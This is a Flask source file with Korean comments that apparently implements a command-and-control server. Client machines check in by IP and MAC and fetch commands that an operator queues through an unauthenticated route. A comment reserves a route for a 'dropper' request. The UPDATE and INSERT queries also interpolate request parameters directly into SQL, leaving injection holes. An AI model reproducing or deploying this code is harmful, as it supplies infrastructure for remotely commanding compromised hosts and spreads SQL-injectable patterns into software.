import sqlite3
from flask import Flask, url_for, render_template, request, jsonify
import datetime

app = Flask(__name__)

#conn = sqlite3.connect('database.db', check_same_thread=False)
#cursor = conn.cursor()

# SQLite 데이터베이스 연결 설정
def connect_to_database():
    conn = sqlite3.connect('database.db', check_same_thread=False)
    return conn

# SQL 쿼리 수행 함수 (트랜잭션 내에서)
def execute_sql_query(query, params=None):
    conn = connect_to_database()
    cursor = conn.cursor()

    try:
        if params:
            cursor.execute(query, params)
        else:
            cursor.execute(query)

        # SELECT 쿼리의 경우 결과 반환
        if query.strip().upper().startswith('SELECT'):
            result = cursor.fetchall()
        else:
            result = None

        conn.commit()  # 변경사항 커밋

        return result

    except sqlite3.Error as e:
        print(f"Error executing SQL query: {e}")
        conn.rollback()  # 롤백

    finally:
        cursor.close()
        conn.close()

@app.route('/')
def index():

    insert_command_sql = f"SELECT * FROM database"
    #print(insert_command_sql)
    data = execute_sql_query(insert_command_sql)
    
    print(data)
    return render_template('index.html', data = data)

# s : 커맨드 요청
# Flask route 정의
@app.route('/s')
def web_requests():
    command = request.args.get('c')  # 'ping' 등의 명령을 추출
    ips = request.args.get('ip')  # '192.168.0.14;192.168.0.13' 형식의 IP 주소들을 추출
    ip_list = ips.split(';')  # ';'을 기준으로 IP 주소들을 리스트로 분리

    # 데이터베이스에 명령 저장
    ip_str = "' or ip_address = '".join(ip_list)
    insert_command_sql = f"UPDATE database SET command_line = '{command}', check_box='x' WHERE ip_address ='{ip_str}'"
    print(insert_command_sql)
    execute_sql_query(insert_command_sql)
    return "<script>history.back();</script>"
    #return jsonify({'message': 'Command received and stored successfully'})


# r : 클라이언트 요청
@app.route('/r')
def client_requests():
    ip = request.args.get('ip')
    mac = request.args.get('mac')

    print(1)
    select_query = "SELECT * FROM database WHERE ip_address = ? AND mac_address = ?"
    print(2)
    existing_entry = execute_sql_query(select_query, (ip, mac))
    print(3)

    if not existing_entry:
        # IP와 MAC 주소가 데이터베이스에 없으면 새로 추가
        current_date = datetime.date.today().strftime('%Y-%m-%d')
        insert_query =f"INSERT INTO database (num_index, mac_address, ip_address, command_line, time_table, check_box) VALUES (NULL, '{mac}', '{ip}', NULL, '2024-06-24', 'O')"
        print(insert_query)
        execute_sql_query(insert_query)
        return jsonify({'message': 'New entry added to database', 'ip': ip, 'mac': mac})

    else:
        # Step 2: 이미 존재하는 경우 해당 IP에 할당된 command_line 확인
        command_query = "SELECT command_line FROM database WHERE ip_address = ?"
        command_result = execute_sql_query(command_query, (ip,))
        
        if command_result:
            # command_line이 존재하는 경우 JSON 형식으로 반환
            return jsonify({'command': command_result[0]})
        else:
            # command_line이 없는 경우 메시지 반환
            return jsonify({'message': 'No command assigned for this IP'})


# c: 수행 확인


# d : 드로퍼 요청


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)